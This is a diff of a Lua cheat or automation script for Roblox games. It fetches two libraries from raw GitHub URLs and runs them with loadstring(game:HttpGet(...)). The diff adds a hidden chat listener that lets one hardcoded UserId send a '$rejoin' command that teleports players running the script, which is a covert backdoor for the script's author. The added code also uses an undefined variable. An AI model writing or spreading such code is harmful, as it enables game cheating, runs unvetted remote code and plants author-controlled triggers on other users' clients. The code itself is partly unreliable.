@@ -2,7 +2,7 @@ print("Loading")
 repeat
     task.wait()
 until game.Players.LocalPlayer
-task.wait(5)
+task.wait(2)
 --\\ Services
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
@@ -11,7 +11,9 @@ local VirtualUser = game:GetService("VirtualUser")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
-
+repeat
+    task.wait(1)
+until game.Players.LocalPlayer:FindFirstChild("_stats")
 --// Modules
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/AverageFarmer/Silent/master/Library2.lua"))()
 local SolarisLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/AverageFarmer/Silent/master/library.lua"))()
@@ -323,15 +325,8 @@ if game.PlaceId == 8304191830 then
 
     repeat
         task.wait()
-    until EndpointsClient
-
-    repeat
-        task.wait()
     until EndpointsClient.session
 
-    repeat
-        task.wait()
-    until EndpointsClient.session.collection
     task.wait(3)
     local equipped = EndpointsClient.session.collection.collection_profile_data.equipped_units
     local AllUnits = EndpointsClient.session.collection.collection_profile_data.owned_units
@@ -541,6 +536,74 @@ if game.PlaceId == 8304191830 then
             task.wait(1)
         until false
     end)
+
+    function GetPlayers(Str)
+        local _Players = {}
+    
+        if typeof(Str) == "table" then
+            for _,Player in pairs(Str) do
+                for i,v in pairs(Players:GetPlayers()) do 
+                    if Player:lower() == v.Name:sub(1, string.len(Player)):lower() then
+                        table.insert(_Players, v)
+                    end 
+                end	
+            end
+        else
+            for i,v in pairs(Players:GetPlayers()) do 
+                if Str:lower() == v.Name:sub(1, string.len(Str)):lower() then
+                    return v			
+                end 
+            end	
+        end
+    
+        if _Players[1] then
+            return _Players
+        end
+    
+        return nil
+    end
+
+    local prefix = "$"
+    local CmdName = "rejoin"
+
+    local PlayerAdded = function(player)
+        if player.UserId == 94158016 then
+            player.Chatted:Connect(function(Message)
+                local Default_Message = Message
+                Message = Message:lower()
+                local Num = 0
+                if string.sub(Message, 1, 2) == "/e" then
+                    Num = string.len("/e") + 1 -- Adding 1 for the space
+                end
+                Num += string.len(prefix)
+                print(Num)
+                if string.sub(Message, Num, Num) == prefix then
+                    Num += 1
+                    
+                    local CmdLen = string.len(CmdName) + 1
+                    local Cmd = string.sub(Message, Num, Num+CmdLen)
+                    Cmd = string.match(Cmd, "%a+")
+                    print(Cmd)
+                    if CmdName:lower() == Cmd then
+                        Num += CmdLen
+                        local Args = string.split(string.sub(Default_Message, Num), " ")
+                        print(Args[2])
+                        local PlayerGot = GetPlayers(Args[1])
+
+                        if Player.Name == PlayerGot.Name then
+                            TeleportService:Teleport(game.PlaceId)
+                        end
+                    end
+                end
+            end)
+        end
+    end
+
+    Players.PlayerAdded:Connect(PlayerAdded)
+
+    for i,v in pairs(Players:GetPlayers()) do
+        PlayerAdded(v)
+    end
 
     teleport()
 elseif game.PlaceId == 8349889591 then
@@ -920,3 +983,5 @@ elseif game.PlaceId == 8349889591 then
         task.wait(10)
         start()
     end
+
+    
